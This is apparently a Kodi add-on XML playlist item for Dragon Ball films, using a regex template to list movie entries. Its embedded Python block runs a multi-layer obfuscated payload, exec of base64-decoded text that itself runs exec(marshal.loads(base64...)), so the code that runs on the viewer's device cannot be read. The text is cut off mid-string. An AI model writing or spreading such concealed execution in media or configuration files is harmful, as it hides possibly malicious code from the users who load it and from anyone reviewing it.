<?xml version="1.0" encoding="UTF-8" standalone="yes"?>






 
<item>
<title>[COLOR gold]*[/COLOR] [COLOR white]Dragon Ball [COLOR lime] Peliculas[/COLOR]</title>
<link>$doregex[c]</link>
<regex>
<name>c</name>
<listrepeat><![CDATA[
<title>[c.param1]</title>
<genre>[c.param2]</genre>
<year>[c.param3]</year>
<info>[c.param6]</info>
<link>$doregex[selecion_inteligente]</link>
<thumbnail>[c.param4]</thumbnail>
<fanart>[c.param5]</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
import re,requests,xbmc,xbmcaddon,xbmcgui,urllib2
import base64;exec(base64.b64decode("aW1wb3J0IG1hcnNoYWw7ZXhlYyhtYXJzaGFsLmxvYWRzKGJhc2U2NC5iNjRkZWNvZGUoIll3QUFBQUFBQUFBQUJRQUFBRUFBQUFCemlRQUFBR1FBQUdRQkFHd0FBRm9BQUdRQUFHUUJBR3dCQUZvQkFHUUNBRm9DQUdRREFGb0RBR1FFQUZvRUFHUUZBRm9GQUdRR0FGb0dBR1VIQUdRSEFJTUJBR1VIQUdRSUFJTUJBQmRsQndCa0NRQ0RBUUFYWlFjQVpBb0Fnd0VBRjFvSUFHVUhBR1VKQUdVQUFHb0tBR1VIQUdRTEFJTUJBSU1CQUdRTUFHUU5BSU1EQUlNQkFBRmtBUUJUS0E0QUFBQnAvLy8vLzA1MGt4VUFBRWw1UW14aWJVNTJXa2RXYTBsSFNqVkVVVzlxU1VWYVZWSjNNRXRFVVhCd1lsaENkbU51VVdkWmJVWjZXbFJaTUV4RFFqWmlSMnhwVEVOQ2FtSXlVbXhaTTAxelNVZEtjR0p0Um5wWk1teHdSRkZ3ZEdJelNuZGhSMVl4WTNsQk9VbERZekpPVkZKb1RucHJNMDVFV1RGTmVtc3pUbFJTYlUxNldUSlphbU40VFhwSmVrNVVXVEpPZWxVeFRucE5OVTV0UlhwUFZHTjZUWHBaTVU1RVpHaE9lazB3V1dwamQwMTZSVEZOZW1NMVRucG5NazVxVVRWT2VrMTZUbFJSZWsxNldURk9lbGt6VG5wRk1VNTZXbWhPVkVsNlRYcFJNMDVFUlRKT1ZGcHBUa2ROTUUxNlZUSk9iVVY2VFZSUmVFNXRUWHBPYWxab1RrZEZNRTFVV1hoT1JGRXhUa1JaZUU1VVp6Rk9SRnBxVFhwWmVrOUVTbTFPVkd0NlRrUlZlVTR5UlhwT2VsbDVUbnBKTWxwcVkzaE9SMVV4VGxSVmQwMXRXVEZaVkZGNFRrUk5lazFxU21sT1JHTXdUMVJaTVU1VVNUSlplbVJvVG5wbk1scHFZek5PZW1jelQxUlpNazF0V1hwT1JFMHpUbXBaTVU1NlZUTk5lazE2VFhwS2FVMTZaM2xhYW1NeVRtMUZNMDVFVFhsT1ZFRjVXbXBOTWs1NmEzcE5la3B0VFhwbk0wNUVXbWxPYW10NlQxUlZORTE2VFhsYWFrMHhUWHByTVZsVVdUQk9Na1V4VG5wWk1FMTZRVEpPYWxFMFRYcGplazlFV1RCT1JGRjZUWHBOTlUxdFdUSk9hbFpvVG5wSmVrOUVUVEZPVkZFeVRsUlNiVTU2YXpGTlJFcHRUVzFKZWs1cVl6Vk5iVmt5V1hwS2JVNVVXVEJPZWswMVRucFpNMWxVVm1oTmJWbDVXbXBLYVUxNlNUTk9hbU15VFcxWmVrMUVZekZOYlVsNVdtcGFiRTE2UlRGT2VsSnBUWHBSZVZscVVtdE5iVWw1V21wYWFrNUVhek5OYWsxNFRtcGplazVxV21sT1ZGRjZUWHBWZUU1NlNUTk5hbFpvVGtkRk1scEVUVEpPUjFVelRVUlZlVTVIVlRGT2FrMTRUbFJuTUU1VVRYcE5iVmw2VDBSak5FNTZXWHBOUkZVelRtMU5NazVxVW1wT2JWa3hUMVJqZWsxNlRURk5hbU15VG1wbmVrOVVTbTFPYlZVeFRrUk5kMDVxU1ROT1ZGa3hUWHBuTVU1cVdtbE9hazB6VFdwWk1rNXFhM3BPYW1Nd1RYcHJNVTlFV1RKTmVtY3hUbXBOTVUxNlJUTlBSRlYzVGtkWmVrOVVXVEJPYWtWNlRYcGpNMDR5UlROTmVsa3lUbFJKTUU1RVl6Qk9la1V3VGtSTk5VMTZTVEJaZWxwclRucFpNVmxVV21oT1IwVjZUbnBOTTA1dFVYcE5WRlY2VG5wVk1VMUVUWHBOZWtVeFQwUlJlazU2WnpGT2FrMDBUWHBqTUU1NlZUUk9la1V4VG1wTk0wMXRXVEJPZWsxNlRtcEZNVTVxV1hsT2JVa3lUbXBOZUU1NlRYcE9WRXBwVG5wVk1sbHFZM2hPVkZrelRrUlZlazU2UlROUFZGazFUWHBuTUZsVVpHaE5lbFV4VFZSVk1FNXRUVE5OVkdOM1RsUkpNRTU2V21wT2VrMHlUVlJSTWs1RVl6SlpWRmw1VGtSUk0wMVVXbTFPYW1zelRYcFZNazVxU1RKYVJHTTBUbFJaTWxscVRURk9iVWt6VFdwYWFrNUVhM3BQUkZKcVRXMUpNRmxxVVhwTmVrVXpUbnBqZDA1NmF6Tk5hbEUxVGxSck1FOVVUWGhPZW1jeVQwUmFhRTU2VlRGUFJGazFUbFJqZWs5VVRUSk9lbEV3VFdwUk0wNTZSVE5OYWxFMVRqSkZNazlVWXpKT1ZFRXpUa1JaTWs1VWF6Tk5SR00wVG1wamVrOUVXbXhPVkUwelRucE5lVTU2UlROUFJGVTBUbnBWTVU5VVVtcE9lbWN6VFdwVk1VNXFUVEJOYW1OM1RsUlZlazlFV1RKT1IwbDVXV3BTYVU1NlJURk5lbU13VG1wbk0wNXFXVFZPZW1zeVRYcGplRTVVVFRGT2FsRXlUbFJuTUU1NlkzZE9hbWN6VGtSak5FNVVUVEJOYWxab1RXMVpNMDVxU21sTmVsa3pXVlJaTTAxdFNUSlBSR013VFhwak1scFVWVE5OZWxGNlRrUmFiRTE2V1hwTlJGa3pUWHBKZWs1VVdYcE9hazE2VDFSamVFNTZSWHBPUkZFd1RrUk5NMDFVVW14T1JGRXdUbXBWTWs1RVRUSk9hbHBwVG1wWk0wMXFXVE5PUkdjeFRucGthRTVVYXpOT1ZGVTBUbTFKTUZsVVl6Qk9ha1Y2VDFSVk5VNTZRVE5QVkUwMVRtcFJNMDVxVW1wT2VrRXpUVlJhYlU1RVJYbFphbHByVGtSbk1GcEVUWGhPZWxVd1drUlplVTVxUlRGT1ZGVXlUa2RaZWs5VVRUTk9la0V3VFZSWmVVNTZSWHBOYWxFMVRXMVpNVTFVVVRKT2Fsa3dXV3BaZUU1NlJYcE9hbGswVGtkRmVWbHFUVEZPYWtreFRucFdhRTU2UlRKT1JGRTFUbFJOTVUxRVZUTk9hbWN4VGtSTmVFNVVUWHBPYWxKdFRrZFZNRTVVVVRGTmVsbDZUbXBOZWs1cVVUSlpWRlUxVGxSUmVrMXFVWGhPUkZsNlRXcGpNMDVxUlRKT1ZFcHBUbnBKZWsxRVl6Vk9SMUY2VG5wS2JVNXFVVEZQVkZab1RYcEZNVTU2VFRCTmVrRXdUa1JqTVUxNll6Sk5lbEpvVFhwQk0wMTZWVEpPVjBVelRucFplVTU2VFROTmVsVXlUbFJuZWsxcVVYaE9WRUV4VFVSUk1rNXFWWHBOUkdNMFRucEpNRTVxVW14T2FrMHdUbXBOTVU1RVRUTlBSRlV4VGtkVmVrMTZVbWxPYW1zelRucGpOVTU2VFRGTmVsVXdUbnBSTWs5VVVtcE9SMVY2VG5wUk5FNXFUWHBQUkZrMVRrZFpNazFVVFROT2VtY3lUV3BOTUU1SFRYcE9lbHBxVFhwSk0wMXFWWGhPYWxsNlRucFJOVTF0V1hwTmVsRTFUa1JKTWs1cVRYZE5la2w2VG1wWk1rMTZZekZQUkdNeFRucFZNVTVFV1hoT2Vsa3lXa1JqTUU0eVJUQlBWRnBzVG1wWmVWbHFWWGxPTWtVelRtcFJNazE2V1ROT2FrMTNUbFJKTUZsNldtcE9ha1Y2VFdwYWFrNTZXVEJaZWsweVRtcEpNbHBVVVROT1JHY3lXa1JTYkU1NlFUQlBWRTB4VGxSVk1FNTZUWGxPZWxsNlRtcFZlRTVxVlRGT2FsazFUbFJaTTAxNlVYcE9iVlY2VFVSTmQwMXRXVEZaVkdNelRsUnJNRnBxVFRWT1JFa3hUVlJaTTA1cVdUQk9hazAwVG1wSk1FMVVXVEpOZWxVd1RXcE5ORTU2WXpCWlZHTjRUbFJWZVZscVl6Uk9SR3N3VG5wWmVFNUVSVEpPZWtwcFRucGpNVTFVVFRCTmVsVjZUbFJOTUU1cVNUTk5lbEY2VG5wVk1GbDZVWGhPZW1NeVRXcGpNMDVFWnpKTmVsVjRUa1JaTWsxcVRUSk9SRWt5V2xSU2FrNUVTVEpaVkUwelRsUkZNMWxVV1RKT1JGa3dXVlJqZWs1cVNUQk9hbFV5VGtkSk1VNVVTbTFPZWswd1dWUktiVTU2VFRCWlZHUm9UbFJyZVZscVZUUk9lbEV3VGtSVk5FNHlSVEZOZWxwb1RYcFZNRTE2VVRCTmJVa3dXa1JhYTAxNlZURk5SR013VFhwUmVWcHFVVEJPVjBVeVdWUlZNRTVVWXpCT1JGcHNUa1JWZWsxcVdYbE5lbFV5VFdwUk1FNVhSVE5QVkZWM1RXMVpNMDFVVlhwT2FsRXlUVlJSTWs1cVVUQlpWRXB0VG1wWk1FNVVTbWxPYWxFd1QwUlJlazVFUlRKYWFrMTNUa1JyTUUxNlVtMU9lbWN5V1ZSYWJFNVVSVEZOUkUwelRtcHJNMDlFWkdoT2Vsa3pUbFJWTlU1VVRUTlpWRTEzVG1wak1rNTZUWHBPYW1jeVRtcEtiVTU2U1RGT2VrMTRUbFJCZWs1RVVUSk9SRkV5V1ZSU2JVNUVaM3BQUkUwelRtMVZNMDU2VFRGTmVrMTZUbFJSZWs1VVVUQk9WRkY0VG5wVmVrNXFVbTFPUkZreFRYcGthRTE2VVhwT2VtTTFUbGRGZWs1VVl6Tk9SRkV6VG1wak1FMTZaekZQUkZwclRrUlJlazlFVFRWT2JWRXlUV3BSZUU1RVVYcE9lbEY0VGxSQk1rMTZVVEJPUjFVd1RrUlZORTVVVlRKTmVsVXdUa1JuTVUxcVVtdE9lbEV4VDBSak0wNUVTWHBQUkdOM1RXMVpNRTVFVFhkT1JFVjZUWHBOTUUxNlVUQlplbU14VFhwbk1GcEVZekZPVkdNd1RYcFNiVTV0UlhwTmVrMHhUbnBqTUZsNlRUTk9SRWt4VFdwU2JFMTZVVEZPVkZreVRucEZNVTE2U20xTmJWa3lUMVJTYlU1cVdURk5WRlpvVGtkTk1rOUVXWGxPZW1Nd1RXcGpkMDE2UVROT2FtTXpUa2RWTVU5VVVUTk5iVWt5V1hwTmVVNTZUVEZPVkZVMFRYcFpNMDE2VlRCT2JWVXpUbFJhYkU1SFJYcFBWRmt6VGxSUk0wNUVZekpPVkVVeFQxUlNhRTE2UlRKUFZFMTZUa1JyTUU1RVRUSk9SMFV4VG5wVmVFNVVaM3BPZWxFMVRrUkZlazVxV1hwT2FtdDZUa1JhYVUxNlVYcE9hbHBxVG1wVk0wMUVXVE5PVkVGNlRYcGpkMDE2UlROWlZFMTRUbnBqTUU1RVVUQk5la2t5VGtSUk1VMXRTVEZPVkZGNFRrZE5NMDFVVVRGT1JHZDZUMFJWTWs1RVZURk5lbU0wVFcxWk1FMTZWVFJPUkZsNlRWUmFiRTE2WXpCUFZGVXpUbFJCZWs5RVVUTk9SRVV5V21wVk5VNUVaek5OVkUwMFRtcG5NazVFVFhwT1JHY3dUWHBqTWs1RVNUQlBSRnBzVGtkUk1VMXFWVFJPYlVVeVdYcFJORTVxUlRKT2VsVTBUbFJKTUUxcVRYcE9hbXN6VG1wUk5FNXRTVEZOYWxFeVRucGpNVTlFV1RKT2FtTXhUMFJLYVU1Nlp6SmFWRmsxVG5wak0wNUVVVEpOYlZrelRucFNhazU2V1ROT2VsSnNUbTFWTUZsVVRYaE9hbU15V2tSa2FFMTZUVEZPZWxwb1RrZEpNMDlFWXpST2JWVXdUbFJqZWs1NlRURlBWRlY1VFhwak1scHFWWGxPYW1jelQwUlZNRTVFWnpOT1JHTjNUWHBOTTA5VVRUTk9hbXN3V21wWk1FNVVaek5PZW1ONFRrZEZlazE2WTNwT2JWVXdUa1JqZVU1SFNUQk5lbGw2VG5wTk0wNUVVWGxOZWxGNlRucFJNazE2UVRCWmVsVjVUWHBGZVZwcVkzcE9SRkV4VFVSTk5FNXFZekZOUkZwb1RtcFJNRTFVVFRGT2FsbDZUbFJaTkU1RVozcE9lbFYzVG1wck1GcEVZM3BPUkUxNVdtcGFhVTVxWnpGT2FtTjVUWHBOTUU1cVVYaE9WRUV6VDBSUmVVNXRWVE5aVkZwdFRsZEZlazFxVW14T1ZFRXlUVlJTYTA1NmEzcE9SRkpvVFhwVk1rNTZVbXhPYW1zeVRucFNhazVVU1RKWmVsVTBUakpGTUU1RVVUUk9WRVY2VFdwTmQwNUVaekpPVkZVMVRtcEpNMDU2VlRGT2VsVXdUWHBOTWs1RVJUQk5hbFUxVG1wUk0wOUVXbWxPYlVsNlQwUk5kMDR5UlRKT2VtTXlUbTFKTWs1NlRYZE9SRmt3VFZSWk1FNTZVVEpQVkdSb1RtMU5NVTFFVlRCTmJWa3hUV3BTYlU1SFVUSk5lbGt3VG0xWk1VMXFXVEpPVkdzd1dtcGplazVVU1RKTmFrMDFUbnBCTTA1cVdtdE9SRWw2VDFSTk1FNTZUVEZaVkZwb1RXMVpNbGw2VW1sT1ZFRXpUMFJSZWsxdFdUTk9SRkY0VGxSQmVrOVVXVE5PYWxreVRYcE5kMDE2WnpOT2VrMTRUbnBqTUUxcVRURk9hbU13VG1wVk1rNXFZekphUkZFd1RrUmpNRTVFU21sT1IxRXhUa1JWTlU1cWF6Sk5lazB4VFhwck1VMXFWVEJOZWxFeFRWUlJNazE2YXpCTmFtUm9Ua2RaTTA1VVVUVk9ha2w2VGtSTk1VNTZZekZPUkZsNlRsUmpNMDE2WkdoT1ZHY3lXa1JSTkUxNlRUSlpWRnBzVG5wSk0wNXFXbXRPVkVreVRsUk5lRTE2WXpKT2FsRjVUbXBOZWs1VVl6Tk5iVmt5VFZSVk5VMTZTVEJhVkZWNlRsUm5NbHBFWTNoTmVrRjZUbFJqZVU1dFJUQk5lbEpvVGxSTmVrNXFVVE5PYlUweVRWUlpNazE2VVhsYWFscHJUbFJSZWsxRVRURk9lbWN5VDFSUk5FNUVZekpQVkZrd1RYcFJNVTVFVFhwT1JGVjZUMVJqTWs1SFRUSk9SRnBzVGtSbk1GbHFXWHBPUkUweVRYcGFhRTVFYTNsYWFtTXhUbXBOTTA5VVl6Sk9lbXN3V2xSU2JVNVVTVE5aVkZwclRucFpNazFVVlRST2JVVXlXbXBWTTA1RVZUQk5lazAwVGtkWmVrOUVVVFZPYlZWNlQwUmpNazVVWXpKT1ZFMDBUbFJqTTA5VVRUTk9lbGt4VGtSS2JVNVVZM3BPUkZKc1RrUlZNRmw2V1hwT1ZFMHpUbFJaTlU1VVFURk5SRkY0VGpKRk1rMTZWWGhOZWtsNVdtcFZOVTVVVFRKUFJGcHNUa2RSTVU1VVRUVk9la2t6VG1wa2FFNUVZekZOUkZKclRrUm5NazE2V1ROT2Vra3pXVlJSTTA1SFZUQlphbGt5VFhwVmVrNTZZek5PYWxrd1RsUlNiVTE2YXpCT1ZGVXdUWHByTUZscVRURk5lbXN3V21wTmVFMTZaM2xaYWxKc1RYcHJlazFVVVhsT1IxVjZUa1JaTTA1dFdYbFphbGt6VGtSSmVWbHFWVFZOZWxVd1drUlZlVTF0V1RCT1JHTTBUbnBOTTA5VVZUUk9hbFY2VDFSamVFNUVhekpPYW1NMVRYcEZNMDU2WXpOT2Vsa3lUbFJaTkU1VVFYcFBWRlUxVG5wSk1scEVVbXRPYWsweVdXcFplazVIVVRCYVZFMDBUbTFGTVU1RVdUVk9SR2N5VFdwWk1VNUVaekpOYWxKclRsUmplVnBxWTNsTmJWa3dXa1JaZUUxNlVURlBWR013VFhwak1rOUVXVEZPZWswelQwUlpORTV0VVRCT1JFcHBUbFJaTTA5RVVUUk9SR2Q1V21wVmVVMTZWWHBPVkZKclRsUm5NazVVVFRCT1ZGRXhXVlJOZVUxNlFUSk9hazB4VG5wRk0wOUVWWHBPUkVVeFRsUlpNVTVIVVRCUFJFcHBUa1JyTUU1cVNtbE9WR3N5VDBSS2FVNVhSWHBOZWsweFRtcG5NMDVxV1RSTmVrMHpXVlJWZDAxdFdYcE5WRkUxVFcxSk1VMXFVWGxPYWxreldWUlJNVTE2VFRCT1ZGRjVUbFJuTUU1RVdUTk9lbFV4VDFSVmQwNUVZekZQUkdNeFRtMUpNRnBxVW0xT2FtTjVXV3BTYlU1cVZYcE5WRmsxVG0xVmVrOVVVVEJOZW1Nd1QxUmpNVTVIVlhwTmVsRXdUbFJSTTAxNll6Uk9WR2N5V1ZSUk0wNTZXVEJaYWxGNFRqSkZNMDE2VlROT01rVXdUV3BTYTA1NlZYcFBSR016VGtSUk1scEVZekpPVkdjd1RXcFpNazVIVVROTmFsRXpUVzFKTTA5VVZUQk9lbXN5V2xSTk5VMTZaekJhYWxVeFRYcHJNMDFxV21sT1ZHc3hUbnBhYkUxdFdUSlphazB3VG1wSk1VOUVXVEZPZWtsNlRVUk5NVTE2VVRCUFJHUm9Ua2RKTVU1VVdURk5lbWN5VG5wU2JFNXRVVEZPVkdNd1RtcHJNVTlVV21oT1IxVXlUMVJSTlU1NlVURk9lazB4VGtSWk1VNUVXVFZPUkZWNlRYcGpNRTVxYTNwTmVrMDFUbnBSTTA5RVRUTk9WRlY2VDBSV2FFNVhSVE5QUkZGNVRucGpNRmw2WXpKT1JHY3dUV3BaTWs1VVdUQmFSRkY0VFhwQmVrNUVUWGxPVkZreVdWUk5NazVFWnpOT2FsSnJUbGRGZWs1cVVteE5lbXQ2VG1wUk1FNTZXVEpPZWxab1RtMVJlVnBxWXpCT1JFMTVXV3BTYUU1dFdURk9SRXB0VG5wWk1VMXFZM2RPZWtreVQxUktiVTE2UlhwTmVscHBUbXBSZVZwcVdUVk5iVWt4V1ZSTk5VMTZTVEJOZWxWM1RsUlJNbHBxVFRWT2JWVXhUVVJqTWs1VVJURk5WRnBzVFhwSk1VMUVXWHBPUkdzelRWUk5NMDV0V1ROT2FtTTBUbFJCTUU1NlVYaE9WR2N6VGxSVk1VNUhVWHBQVkUxNFRtcGpNbHBVVW10TmVtTXhUVVJSTVUxNlVYcE5SRnBzVGtSbk1WbFVTbWxPVkUweVRsUlZlVTV0VlROUFJGSnBUWHBSTWs5RVVUUk9lbXN3V2tSVmQwMTZaekJhYW1ONlRtMVpNRnBVVFhwT1IwMHhUa1JOZDA1dFdYcFBSRTB4VGxSUk0wNTZVWHBPVkdkNlRYcFNhRTVVWTNwTlJFMTZUbTFWTWs1VVNtbE9SRlV6VFZSWk1rMTZTVEpaZWswd1RYcFZNbGxVWkdoT2JWVXdXVlJaTlU1cVdURk9lbU42VGxSck0wMTZUWGhPZWxVelRYcFZOVTVIU1ROWlZHTjNUVzFKTUUxcVRUVk9iVmt3VG1wWmVrNTZXVEJaVkUweFRtcHJNMDVxWXpWT2VsVjZUMVJOZVU1VVVURk9lbEpvVG1wRk1rNTZXbWhPUkUweVdtcFZNazVxVFROT1JGRjRUa1JaZVZscVRUVk9iVmt6VDBSVk5FMTZWVEJQVkZVeVRtMVpNMDlFVVhoTmVrMHlXVlJaTlU1RVp6RlpWR016VGtkVk0wMTZaR2hPYWtreVdXcFJOVTE2YTNwTlZGazFUWHBuZWs1NlVtcE5la1V3VDBSUk5FMTZaekJaVkZKclRYcFpNRmxVVlhwTmVrRXlUbXBaZVU1NlZYcE9SRkp0VGxSQk1FNTZXVEZPYWxrd1QxUlJlVTF0V1ROT1JGa3hUakpGZWs1cVdUSk9Na1Y1V1dwTk1rNVVhekJPYWxFMFRtcGpNMDU2V1RCT1IwVjZUa1JqTTA1cVVYcE9WRmsxVGxSbk1rOVVXbWhPVkdjeFRsUlJNazE2VlRCTlZGSnBUbXBWTVU1NlVYbE9hbEV3VFZSTmVrNXRUVE5aVkZVMFRrUlZNRnBFVVhwT2JVMTZUWHBqTWs1cVVURk9lbEp0VG0xVmVrOVVZM3BPUkdzd1RYcE5OVTU2U1RCUFZGVXpUWHBCTWs1cVdUTk5iVmt6VGxSUmVVNHlSVEpQUkZKclRrUlJlazlVWXpST1ZHY3lUVlJaTkU1VVkzU1RGUUFBTTBGM1NHdGFiWEF6V20xTU0wRlVXak5hUjBSdFFWUklNa0Z0VERKYWVsWXdXbmRNYTBGM1VqRkNVWEF4UVhkd2JFMTNjREZCZWxZeFduZGFNMXA2VEcxQ1VVZ3hRWHBTYlVKSFJHMWFiWEF5VFhkRmRWcDZURE5hVVV3eVFXMTBNa0YzY0RWQlZFUXhRVWRhTlVFeVVqTmFkMFYyV20xTU0wRjNUWFZCVVhnelRFZGFNVUZSV2pCTWJVMTNRVzEwYlVGdFRERkJkM1J0V2tkRmRrRkhVbTFDUjFvMFFXMTBiVnB0V214QmQwZ3lXbTFJYTBGM1ZtMUJSMFJ0V20xNE1VSkhTREZCVVhBeldtMVhka0Z0Y0cxQlIxb3dRVWQwYlVGdGNHcEJSMFJ0V20xTU5VRjZXakJNYlVsMVFYcFdNMEYzUkRCQlVYQXhRVzFNTkVGM1VqRkNVWEJzUVZSRU1rRkhTR3RCUjFveVRFZElORUYzU0RCTlIweHRXbTE0TWsxM1NEUkJkMFF6V2tkRU1WcHRlREpOVVVnMFFXMUliVUZIU0RKQmJYQXpRVzFhTWxwdGNETkNVVTE1UVZGSU1FeDNWM1pCYlhCdFdtMWFNMEY2UkROQmQweHRRVkZFTTB4SFNHeGFlbFl3UVhkSWFrRlVUREZDVVZkNlFVZE1NVUZIU0dwQmVrUXlRVkZ3TlVGdFRETkJSMGhyV20xNE1reDNSREJCYlVnelFVZE5lRnB0VG0xQ1Iwd3hXbnBXTUZwSFRYVmFiWFF6UWtkRmVWcHRWbTFDVVhCcVFWRkViRTEzUlhWQlNsSXdUSGR3YWtGNlJESk5SM0F4UVVkV2JVRnRUWFZCZWxJelFYZElNVUZIUkcxQ1IxcHNRWGRFTWxwM1dqRkJNbEl4UWxGSU0wRkhjRE5DUjBnMFFXMUVNVnAzV2pOQmJYUXlRVkZ3TVVGVVVteE1kMXBzUVcxV01GcDNjREJCVVhCc1RYZEliVnA2VERCQlIwUXpRVWRPTWxwdFREQmFiWEF6V20xWGRrRkhSREphYlVoc1ducFdNRnBIVjNwQlVWb3hRVzFNTWtGM1VtMUJiWEF6UVVkRU1FMUhXbXRCZDFveVFWRkVORnB0ZEROQ1IwUTBRVEpTTUVGSFYzWmFiWFF3UVZGYWJVRjZXakZNUjBoclFXMTBNRXhIVEd4QmQzZ3pRVWR3YlVGUlVqTk1SMW8wUVcxV01FeEhXakJCZDBneVdtMUZlVnB0ZUcxYVIweHRRVlJhYlVKUmNETmFiWGh0UVhkTU1scHRkREJhZDFvMVFYcElNVUpSV2pWQlNsSXlRVkZhTWtGM1VtMUJkMFF3UVhwRU1GcEhUREZCUjFZeVRVZHdNMEZ0Y0RGQ1VYRjFRVkZTTTBGM1NHMUJkMHd5UVcxRWJFRjNUREpDUjNCcldtMUVNa3hIV20xQlZFZ3lRWGRKZFVGNldtMUJkMHcwUVVkME1WcFJTR3RCUjA0d1RWRkpkVUZIZUROTVIwZ3dXbTEwTUVGdFNHcEJWRm96UVhkYWJVRlVTREpOVVV3MFFVZEViRXgzV20xQlVWSXdUVWROZVZwdFZqQkNSMHd5V20xU2JFMTNjR3hCVVVReFFsRkZlRUYzZURCQlVVd3hRWGR3TUZwSFRYbEJiVWd4V2xGYU5FRnRlRE5CZDNBeFFYZHdiVUZIVFhWQlIzUXlURWRFYkVGNlREQk1iVm8wUVVkRU1rRjNUWGhCZDB3d1RWRkViRUZSVEROTVIzQnFRWGRNTUZwSFJEUkJWRWd4UVZGd05FRnRWakpOVVVWNlFWUkliRXgzV2pGQk1sSXpXbmRFTVVGdFRESk5kMHhyV20xNE1WcEhSRzFCZDNnd1dtMU1Na0ZVUkRKQ1Ixb3pRWHBTTUVGM1NETkJVVlp0V25kTmVVRlVUREpNUjFvMVFXMUVNa0YzY0RKYWVreHRXa2ROZDFwdFJHeE5kMFEwV25wV01VSlJUR3hhZWxadFFYZEVORUY2V20xQlVYQXhRVkZTTTFwUmNESkJTbEl4UWtkTmRVRkhjREJNZDBneFFVZDBiVnBSU0RWQlIzZ3hXbTFNTVVGSFNHMWFkMGwxUVhwYU1rSlJjRzFhYlhneldtMUVOVUZ0V2pOYVIwZ3lRWHBJTWxwM1NETkJiVkl6UWtkSU5VRjNWakZhUjBSdFFVZE9NRUZIY0dwQmQzUXpRVkZFYkVGSFdqSk5SM0F3UVcxRU0wSlJjREpCVVhBelduZGFOVUZVVmpGTVIxb3pRWHBTTVZwUlRESmFiWFF6V2tkYWFrRnRXak5CYlVodFFVcFNNVUYzU0RKQmQzQXlUVWRGZFZwdFVqQkJkM0YxUVhwV01VRjNSREZCZWt3eFdtMWFhMEYzVW0xYVIwaHJRVzFhTTBGM2NEQkJiVm93VEhkYWJFRlVSREpNZDBnMFdtMUlNVUpIVEd0QmVsWXlUWGRGZVVGVVJERkNVWEF6UVhkd01rMUhUWFpCYlhBd1RHMXhkVnB0Y0RKTlIwZ3hRVWRNTVVGdFJYWkJiVVF5VEVkRmVVRlJUREZCYlZvMVFYcFdNa0pIVERWQmJWWXdRWGROZUVGUldqQkJVVTEyV20xTU1FMVJWM3BCVkVnd1dtMUViVnB0ZEcxQ1VYQTBRWHBTYlZwM2NHdEJVVXd5VEcxYWJFRlJjREphYlZkMlFXMWFNVnAzY1hWQlIxcHRXbTFOZFVGVVREQkJkMFY2UVcxRU1scHRXalJCZDB4dFFVZElNa0ZIVmpCYWJWbzBRWHBFYlZwSGNHMUJVVWh0UVcxTmQwRlJWakpNYlhCc1FXMUVNMEpRY0VGUVlVVnNia28xWTNGVmVIUkRSazVoV0ROak1rUktaME55U1U1cFFWRnhOWEY0TVhWeGJEbEdXREE1YTAxSlNXTnlVbW93V2twblYwaFJjVFJKVkRWSGJ6SnJZazFKZVhWTVMySTFjbmRKVW5BeWRESlpNMU5sUmpJeFFVZFVZalZKTW1zMWIxTkZiVVZ0VDFKdmVVVXlUVWwxUzAxaFJXZHlVM0ZKVFVoNU1XOHlUVnBhZUhsb1NVZDFiVXA2TlVKWU1GZFZXa2Q1VEc5VFUyTnhWVUZUVFcxWGVrcFZUVWx2ZVZkUlIxTk5hVzk1V2pGYVNrMHljVEJOUm5CdGVVeEtWSFY1Y0VweE5uSlRVMUJ5VVVGWFRVdEJabkV5TVVwYVVWZDNRVEZOU0ZsdFJURk1ZVVZXUVRGWFlVRktWMmx3ZDFvd2JrcE5Xa2d5WjNoSFNIbG5jREJGUjFnd1dtdFlNM2t6UkRKbWEyNHdhMHhDVkVVMmNuaFRZMGw1WTBaSFUyTnVjSGRUUkc1SGVUSnhTRGxsUWtsWFNWcDZOVXBKU0VWamNUQnhhbTU1VTJ4Wk0wMVlia3R3YVVGVlYwTllNMEZaY2toblVFMVNaMUJHVVZkWlRHRlhkVVF3TVRCS1IwbFJUVWhFTTBGSVRUVkhkM0EwUlcxd2FYRlNaM2ROTURsMWJqTkJhbTU2TVZsQ1UyTmFRbFJyTUZsdGNVaHdNRFZwY21GSldVRXlSVVphTUdwdFFVcG1NVnBUU1V4eFZFaHBSRXBtWlZwU05HbEZVVTFvU25oMVkwZHRkREZHUzNVd2NFdEZSSEJJT1VsS1NHWmxjWGxOYkZwNWRXZEtlbmw2UVdGNGFVWkxZakJaTWt3eFNraG1hMFpJY1hsYVIxZExjRk5GYTI1UlJXVnVTMDlRYjBwclkweDZlRFJKYlhGS2NESXdNRWQ2U0dwTlNFUmxSR0ZpYlVadFNUSkdNMU15VFROak5FZDRXakJJU0UxcVFsSmFiRzU2U1ZOTk1FbHJia2cxV1Zrd1YyMUZTakJyYm5wVGQwUkhSVnBhUm1kR1JUTlhlVVl4VjFkdWVHcHBSa2xQYUc0eFVtMUNVa1ZQUWxJMU1XOHhWMjVCUzBWQ2NESTFXbkpLVFZwdVVVRjRiMG94YkVKSlUybHZTbU5ZVFZGNWRVcExUbXhHTUZkUFdXMVRZa2RVTkRSRU1qbDVSVzFUYUVKS2RXVnVTVVZEV25wMVprSklWMWR5WVVWYVFVcE5URVl3VTJkd01uRlZTbUZYZVc1VWEwTk5VVWsxY2tvMWEwRkxkVWRFZDFOaldrcGpWVVl4V2pCRlNVRnVSVWhqTVVoS1FYaEdZVTk0UkV0SWFrRXlUVEJCU25GWFNIWTVaM0JJUVZWQ1VrZ3pTbUZGZW01M1FWVkVTR05qUkhwcmFrRlVPVzF3ZUdOYVFrZFhlbTk0VFRKR2RtZFZSMVF4TkhGaFQxTkpNSFZ0UkRJd05VMHhTVTlCTW5rd2NESkZiRUY0VFdaWk0wMVlSa2hKWVVKVlkyZHhTRlkwUm5wd2JVVjNUV3RGVkRoc1NETkJlVnAyT1dsQ1NFUXhSSGxGWkVRd2NYbENTMU5YVFZWTlNrMVZkVzV3TUVGYWIyeG5XRWxMUVRaR2VHY3lRa2RJYlhKS2EyTkZNRmRVVFhkeFQzQlNZMnBJTTBWalRUSm5OWEF5Y1RSSFMwbGFTVWR4Tlc5TGVUSnZlRGxKY2xOT01YSjZOVzFNTUhsUVNrcFdhVXhMZEdWeWVHTm5jRlI1VUc5VWNWWnhNMDlzV2tsSmFFMUtSVEZ1UjFKcWJsVkpZVzV0ZVUxRWVVVlZUVE4wTTI1VWExcHdWVk5GUkVsamRVUnRUREp3UzJKclNWUjVTVUpIUVhkSFMxWXliMjEwTW00eGVVWnlkbWRCUm0xQmJFbFVPVTFLVkZadFFXRkpWa2RLVWpCTVNuRm